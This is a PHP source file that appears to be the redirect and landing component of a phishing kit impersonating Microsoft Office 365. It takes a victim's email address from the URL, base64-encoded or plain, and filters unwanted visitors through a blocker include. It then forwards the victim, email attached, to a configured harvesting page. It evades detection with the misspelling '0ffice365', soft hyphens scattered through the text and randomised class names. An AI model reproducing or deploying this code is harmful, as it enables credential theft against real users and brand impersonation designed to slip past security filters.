<?php

error_reporting(0);include('blocker.php');include('config.php');

?>
<!DOCTYPE html">
<html>
  <head>
    <title>Review: <?=$RndString1?> 0ffice365<?=$RndString1?></title>
    <?
    if($autoEmail==false || $autoEmail=="false" || $autoEmail=="FALSE" || $autoEmail=="False"){
if($redirecttype==1 || $redirecttype=='1'){
header("Location: ".$pagelink);       
    }else{
echo "<script type=\"text/javascript\">window.location.href = \"$pagelink\"</script>\n";      
    }
die();
}
preg_match("/[^\/]+$/", urldecode( $_SERVER[ "REQUEST_URI" ] ), $matches);
$data = $matches[0];
   function begnWith($str, $begnString) {
      $len = strlen($begnString);
      return (substr($str, 0, $len) === $begnString);
   }
   if(begnWith($data,"?"))
 {
 $data = ltrim($data, '?');   
}
function endsWith($string, $endString) 
{ 
    $len = strlen($endString); 
    if ($len == 0) { 
        return true; 
    } 
    return (substr($string, -$len) === $endString); 
} 
if(endsWith($pagelink,"/")) 
 {
 $pagelink = rtrim($pagelink, '/');   
}
if ( base64_encode(base64_decode($data)) === $data){
$email = filter_var(base64_decode($data), FILTER_SANITIZE_EMAIL);
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    if($redirecttype==1 || $redirecttype=='1'){
header("Location: ".$FailRedirect);        
    }else{
echo "<script type=\"text/javascript\">window.location.href = \"$FailRedirect\"</script>\n";        
    }
die();
} else {
    $email = $data;
}
} else if(filter_var($data, FILTER_VALIDATE_EMAIL)) {
    $email = base64_encode($data);
} else {
    if($redirecttype==1 || $redirecttype=='1'){
header("Location: ".$FailRedirect);        
    }else{
echo "<script type=\"text/javascript\">window.location.href = \"$FailRedirect\"</script>\n";        
    }
die();
}
function rndString($length=10){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);};$randpart=$randfirstpart.''.RndString(8).'-'.RndString(4).'-'.RndString(4).'-'.RndString(4).'-'.RndString(12).'_'.RndString(50).''.RndString(50).''.RndString(50);
if(($AutoGrab && !isset($_GET['data'])) || (!$AutoGrab && ((isset($_GET['status']) && $_GET['status']!=='putuser' && !isset($_GET['data']))||(!isset($_GET['status'])&&!isset($_GET['data']))) )){$relative_path=dirname($_SERVER['PHP_SELF']);if($fixIndex==true || $fixIndex=="true" || $fixIndex=="TRUE" || $fixIndex=="True"){$fixIndex="index.php?";$fixPart="&data=";}else{$fixIndex="";$fixPart="?data=";};if(!$AutoGrab && ( ( !isset($_GET['status']) && !isset($_GET['data'])) || (isset($_GET['status']) && $_GET['status']!=='putuser')) ){/*$fixPart=str_replace("data","status",$fixPart)*/ if($fixPart=='&data='){$fixPart='&status=';}elseif($fixPart=='?data='){$fixPart='?status=';};$data='putuser';} header("Location: $relative_path/$fixIndex$randpart$fixPart$data");}
$rndString1=rndString(7);$rndString2=rndString(8);$rndString3=rndString(6);$rndString4=rndString(5);$RndString1=str_repeat("­",rand(1,3));$RndString2=str_repeat("­",rand(1,3));$RndString3=str_repeat("­",rand(1,3));$RndString4=str_repeat("­",rand(1,3));$RndString5=str_repeat("­",rand(1,3));
    if($redirecttype==1 || $redirecttype=='1'){
header("Location: ".$pagelink."/".$email);       
    }else{
echo "<script type=\"text/javascript\">window.location.href = \"$pagelink/$email\"</script>\n";      
    }
die();
?>
  </head>
  
  <body class="<?=$rndString1?>" display="none">
  <div id="conteneur" class="<?=$rndString1?>">    
    <h1 id="header" class"<?=$rndString2?>"><a href="#" title="Review: <?=$RndString1?> 0ffice365<?=$RndString1?>"><span>Review: 0ffice365<?=$RndString1?></span></a></h1>

    <nav>
      <ul id="menu">
        <li><a href="#">Etape n°1</a></li>
        <li><a href="#">Etape n°2</a></li>
        <li><a href="#">Etape n°3</a></li>
        <li><a href="#">Etape n°4</a></li>
        <li><a href="#">Etape n°5</a></li>
      </ul>
    </nav>
    
    <div id="contenu" class="<?=$rndString3?>">
      <h2>Review: <?=$RndString1?> 0ffice365<?=$RndString1?></h2>
      <p>Review: <?=$RndString1?> 0ffice365<?=$RndString1?></p>
    </div>
    
    <p id="footer" class="<?=$rndString4?>">0ffice<?=$RndString1?>365 service is a line of subscrip<?=$RndString2?>tion services offered as part of the Office produ<?=$RndString5?>ct line. The brand encom<?=$RndString1?>passes plans that allow <?=$RndString2?>use of the Office software suite over the life of the subscr<?=$RndString3?>iption, as well as cloud-based soft<?=$RndString4?>ware as a service products for business environm<?=$RndString5?>ents, such as hosted Exchange Server, Skype for Busi<?=$RndString1?>ness Server, and SharePoint, among others. All 0ffi<?=$RndString2?>ce365 plans include automatic updates to their respective software at no additional charge, as opposed to conventional licenses for these programs—where new versions require purc<?=$RndString3?>hase of a new license.</p>
  </div>
  </body>
</html>